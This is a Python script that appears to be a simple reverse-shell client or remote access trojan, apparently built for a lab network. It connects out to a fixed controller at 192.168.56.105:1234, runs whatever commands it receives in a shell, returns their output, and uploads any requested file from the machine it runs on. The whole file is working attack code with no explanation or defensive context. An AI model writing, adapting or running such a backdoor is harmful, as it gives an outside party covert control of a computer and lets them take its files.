#!/usr/bin/python3

import subprocess
import os
import socket
import re

def download(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet=f.read(1024)
        while len(packet)>0:
            s.send(packet)
            packet=f.read(1024)
        s.send('done'.encode())
    else:
        s.send('Nope file'.encode())

def connect():
    s=socket.socket()
    s.connect(('192.168.56.105',1234))
    return s

def receiveLove(s):
    while True:
        try:
            command=s.recv(1024)
            if 'Omae wo shindeiru!!' in command.decode():
                print('Dead')
                s.close()
                break
            elif 'ls' in command.decode():
                cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                s.send(cmd.stdout.read())
                s.send(cmd.stderr.read())
            elif 'cd' in command.decode():
                path=command.decode()[3:]
                try:
                    os.chdir(path)
                except:
                    pass
            elif 'biter' in command.decode():
                #cmd=subprocess.Popen('pwd',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                #s.send(cmd.stdout.read())
                #s.send(cmd.stderr.read())
                temp=os.listdir('./')
                #fileArray=[]
                s.send(str(len(temp)).encode())
                for i in temp:
                    cmd=subprocess.Popen('file ' + i,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    s.send(cmd.stdout.read())
                #s.send(str(len(temp)).encode())
                print(temp)
            elif 'psyche' in command.decode():
                print(command.decode())
                s.send('No command'.encode())
            elif 'download' in command.decode():
                phrase,path=command.decode().split(' ')
                try:
                    download(s,path)
                except:
                    pass
            elif 'fillmeup' in command.decode():
                print('hi')
            else:
                cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                s.send(cmd.stdout.read())
                s.send(cmd.stderr.read())
                print(command.decode())
        except:
            print('Dead2')
            s.close()
            break


s=connect()
receiveLove(s)
